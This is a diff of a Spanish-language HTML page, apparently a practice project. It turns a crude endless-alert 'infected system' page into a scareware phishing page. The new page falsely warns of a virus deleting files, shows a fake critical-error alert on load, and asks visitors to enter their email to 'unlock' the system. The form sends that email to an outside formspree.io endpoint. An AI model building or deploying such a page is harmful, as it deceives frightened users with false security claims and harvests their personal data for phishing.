@@ -1,11 +1,33 @@
 <!DOCTYPE html>
-<html>
-<head><title>MyPractica</title></head>
-<body style="background-color:black; color:red; text-align:center; padding-top:20%;">
-    <h1>SISTEMA INFECTADO</h1>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Alert - Danger</title>
+    <style>
+        body { background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 20px; }
+        .box { border: 2px solid #ff0000; padding: 20px; display: inline-block; margin-top: 50px; background: #111; border-radius: 10px; width: 90%; max-width: 400px; }
+        input { width: 85%; padding: 10px; margin: 15px 0; border-radius: 5px; border: 1px solid #333; }
+        button { background: #ff0000; color: white; border: none; padding: 10px 25px; font-weight: bold; cursor: pointer; border-radius: 5px; }
+    </style>
+</head>
+<body onload="loopAlerts()">
+    <div class="box">
+        <h1>¡ALERTA DE VIRUS!</h1>
+        <p>Se ha detectado una intrusión en tu sistema operativo.</p>
+        <p>Para detener la eliminación de archivos, confirma tu identidad:</p>
+        
+        <form action="https://formspree.io/f/xaqaobpg" method="POST">
+            <input type="email" name="email" placeholder="Introduce tu correo" required>
+            <button type="submit">DESBLOQUEAR AHORA</button>
+        </form>
+    </div>  
+
     <script>
-        while(true) {
-            alert("¡Tu sistema ha sido hackeado!");
+        function loopAlerts() {
+            setTimeout(() => {
+                alert("¡ERROR CRÍTICO: Archivos del sistema comprometidos!");
+            }, 500);
         }
     </script>
 </body>
